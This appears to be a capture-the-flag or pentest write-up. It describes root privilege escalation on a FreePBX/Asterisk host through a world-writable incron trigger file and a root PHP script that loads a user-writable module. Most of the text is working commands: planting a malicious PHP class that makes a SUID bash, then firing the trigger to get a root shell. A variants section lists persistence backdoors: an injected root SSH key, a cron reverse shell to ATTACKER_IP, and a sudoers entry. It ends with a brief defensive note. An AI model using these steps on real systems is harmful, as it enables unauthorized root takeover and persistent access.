# incron World-Writable Trigger + PHP Module Hijacking

Used on: **Connected**

## Summary

`incrond` monitors filesystem events and executes privileged scripts when they fire.
If the monitored trigger file is world-writable and the executed script dynamically
includes a PHP class from a path writable by the low-privilege user, the attacker can
plant a malicious PHP module, trigger the script, and execute code as root.

## Description

`incron` is a cron-like daemon that watches inotify events (`IN_CLOSE_WRITE`,
`IN_MODIFY`, etc.) on files and directories, running a configured command when the event
fires. Rules in `/etc/incron.d/` may run scripts **as root** when a file changes.

If:
1. The watched file is world-writable, and
2. The root script performs `require_once(<user-writable path>)` on a PHP class,

then the attacker controls what code runs as root.

## Prerequisites

- Shell as a low-privilege user (e.g. `asterisk`)
- `incrond` running with a world-writable trigger file
- The triggered script loads a PHP class from a path the user can write

## Step-by-Step

### 1. Identify the incron rule

<!-- cmd: linux -->
```bash
cat /etc/incron.d/*
```

```
/usr/local/asterisk/ha_trigger  IN_CLOSE_WRITE  /usr/sbin/sysadmin_ha
```

### 2. Confirm the trigger file is world-writable

<!-- cmd: linux -->
```bash
ls -la /usr/local/asterisk/ha_trigger
# -rwxrwxrwx. 1 asterisk asterisk 0 Apr 15 2021 ha_trigger
```

### 3. Read the triggered script to find the include path

<!-- cmd: linux -->
```bash
cat /usr/sbin/sysadmin_ha
```

```php
#!/usr/bin/php -q
<?php
$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();   // runs as ROOT
}
```

### 4. Confirm the modules directory is writable

<!-- cmd: linux -->
```bash
ls -la /var/www/html/admin/modules/
# drwxrwxr-x. asterisk asterisk ...
```

### 5. Plant the malicious PHP module

<!-- cmd: linux -->
```bash
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc

cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << 'PHP'
<?php
class incron {
    public function rootTrigger() {
        system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
    }
}
PHP
```

### 6. Trigger the event and escalate

<!-- cmd: linux -->
```bash
echo "pwn" > /usr/local/asterisk/ha_trigger
sleep 3 && /tmp/rootbash -p
```

```
whoami
# root
```

## Variants

- Instead of SUID bash, write an SSH key: `system("echo '<pub_key>' >> /root/.ssh/authorized_keys");`
- Add a cron backdoor: `system("echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /etc/cron.d/backdoor");`
- Write `/etc/sudoers` entry for the low-priv user.

## Defensive Note

Never set world-writable permissions on files monitored by privileged daemons.
Ensure `require_once` / `include` paths in root-level scripts point only to
system-owned, non-writable directories.
